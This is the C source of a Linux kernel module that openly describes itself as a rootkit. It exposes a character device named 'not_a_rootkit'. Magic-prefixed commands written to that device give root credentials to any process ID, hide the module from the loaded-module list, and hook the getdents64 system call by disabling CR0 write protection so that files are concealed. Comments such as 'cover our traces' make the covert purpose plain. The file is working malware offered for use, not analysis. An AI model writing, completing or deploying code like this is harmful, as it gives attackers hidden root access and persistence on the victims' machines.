/*
 *	simple kernel module
 */

#include <linux/module.h>		/* used by all modules */
#include <linux/kernel.h>		/* used by KERN_INFO and others */
#include <linux/init.h>			/* used for macros */
#include <linux/fs.h>			/* used for filesystem stuff */
#include <linux/uaccess.h>		/* required to include <asm/uaccess.h> */
#include <asm/uaccess.h>		/* handling data to userland buffers */
#include <linux/device.h>		/* class/device creation */
#include <linux/slab.h>			/* kernel memory allocation */
#include <linux/string.h>		/* string functions */
#include <linux/cred.h>			/* credential structures */
#include <linux/sched.h>		/* task and pid related operations */
#include <asm/current.h>		/* definition of 'current' (the current task) */

#include <asm/page.h>			/* definition of PAGE_OFFSET */
#include <uapi/asm/unistd.h>	/* syscall numbers */
#include <linux/dirent.h>		/* dirent struct */
#include <linux/kallsyms.h>		/* finding addresses of syscalls */

#include <../arch/x86/include/asm/paravirt.h>	/* for adjusting write protection */
#include <linux/gfp.h>			/* GFP defines */

#include <hooking.h>
#include <priv_escalation.h>
#include <module_hide.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("me");
MODULE_DESCRIPTION("simple module");
MODULE_VERSION("0.0.1");

/* prototypes */
static int __init trivial_init(void);
static void __exit trivial_exit(void);
static int trivial_open(struct inode *, struct file *);
static int trivial_close(struct inode *, struct file *);
static ssize_t trivial_write(struct file *, const char *, size_t, loff_t *);
static ssize_t trivial_read(struct file *, char *, size_t, loff_t *);


/* useful defines */
#define DEVICE_NAME 		"not_a_rootkit"		// name appears in /proc/devices
#define CLASS_NAME 			"not_a"
#define SUCCESS				0
#define ASCIINUM_TO_DEC(x)	(x-48)				// conversion from ascii to decimal

#define WRITE_PROTECT_FLAG (1<<16)

/* globals (within this file) */
static int majorNum;					// device major number assigned
static int deviceOpen = 0;				// track if device open, may be useful later
static struct class *devClass = NULL;
static struct device *devStruct = NULL;


/* syscall stuff */
unsigned long *syscall_table;
sys_getdents_t sys_getdents_original = NULL;

/* module hiding */
int module_is_hidden = 0;
struct list_head list_head_saved;
struct module_kobject mkobj_saved;
struct list_head *module_previous;
	

/* must declare file system operations that device can perform- see linux/fs.h */
static struct file_operations fops = {
	.read = trivial_read,
	.write = trivial_write,
	.open = trivial_open,
	.release = trivial_close
};


/*---------------- startup/shutdown ------------------------*/
/* function called on module initialisation */
static int __init trivial_init(void) {

	/* register our device with the kernel */
	majorNum = register_chrdev(0, DEVICE_NAME, &fops);

	if (majorNum < 0) {
		printk(KERN_ALERT "Failed to register rootkit chardevice\n");
		return majorNum;
	}
	
	/* register the device class */
	devClass = class_create(THIS_MODULE, CLASS_NAME);
	if (IS_ERR(devClass)) {
		unregister_chrdev(majorNum, DEVICE_NAME);
		printk(KERN_ALERT "Failed to register rootkit char class\n");
		return -1;		// tmp value
	}

	/* create the device */
	devStruct = device_create(devClass, NULL, MKDEV(majorNum, 0), NULL, DEVICE_NAME);
	if (IS_ERR(devStruct)) {
		class_destroy(devClass);
		unregister_chrdev(majorNum, DEVICE_NAME);
		printk(KERN_ALERT "Failed to create rootkit device\n");
		return -1;		// tmp value
	}

	/* get the syscall table in memory */
	syscall_table = find_syscall_table();
	if (syscall_table == NULL) {
		return -1;
	}

	
	sys_getdents_original = (sys_getdents_t) syscall_table[__NR_getdents64];

		
	printk(KERN_INFO "Registered rootkit with the kernel. Thanks kernel\n");

	return 0;
}

/* function called on module removal, should reverse init function */
static void __exit trivial_exit(void) {
	
	/* unregister the device, cover our traces */
	device_destroy(devClass, MKDEV(majorNum, 0));
	class_unregister(devClass);
	class_destroy(devClass);
	unregister_chrdev(majorNum, DEVICE_NAME);
}

static int trivial_open(struct inode *inode, struct file *f) {
	printk(KERN_INFO "Inconspicuous device opened\n");
	return 0;
}

/* not sure if this is required, may have some use for this in future though */
static int trivial_close(struct inode *inode, struct file *f) {
	return 0;
}

/* 
 * called when a process writes to the device, used to execute specific commands 
 * expects the amount of bytes written returned
 */
static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_t *off) {
	//printk(KERN_INFO "Write performed to inconspicuous device\n");

	char *privBuf;				// our own buffer in kernel space
	char magic[] = "do-";		// magic prefix for all commands
	char *cmdPtr;				// track where in command statement we are later

	privBuf = (char *) kmalloc(len+1, GFP_KERNEL);	// allocate normal kernel RAM
	if (privBuf == NULL) {
		printk(KERN_INFO "ROOTKIT: failed to allocate kernel buffer");
		return len;
	}

	/* we are working with a user buffer, must copy into kernel space */
	copy_from_user(privBuf, buff, len);

	/* if the string starts with the magic prefix, we try to execute the command */
	if (memcmp(privBuf, magic, 3) == SUCCESS) {
		cmdPtr = &privBuf[3];			// cmdPtr should now be the given command

		/* case root access to a process- number after command indicates pidf */
		if (strncmp(cmdPtr, "root", 4) == SUCCESS) {

			cmdPtr = &cmdPtr[4]; 		// the beginning of the pid given
			if ((*cmdPtr) != '\0') {
				/* see man strtol for arguments */
				int pid = (int) simple_strtol(cmdPtr, NULL, 10);
				give_root(pid);
			}
		} else if (strncmp(cmdPtr, "hide", 4) == SUCCESS) {
			hide_module(&module_is_hidden);
			/* hook syscall table */
			write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
			syscall_table[__NR_getdents64] = sys_getdents_new;
			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);

		} else if (strncmp(cmdPtr, "unhide", 6) == SUCCESS) {
			/* restore our hooked functions */
			write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
			syscall_table[__NR_getdents64] = sys_getdents_original;
			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
			unhide_module(&module_is_hidden);
		}
	}
	kfree(privBuf);		// leave no trace
	return len;
}

/*
 * called when a process reads from the device, expects number of bytes read to be returned
 * maybe we give back custom data (say, from a command given to write()) in future
 */
static ssize_t trivial_read(struct file *f, char *buff, size_t length, loff_t *offset) {
	printk(KERN_INFO "Read performed on inconspicuous device\n");
	return 0;		// signal EOF for now
}

/* must call these and pass in our init/exit functions */
module_init(trivial_init);
module_exit(trivial_exit);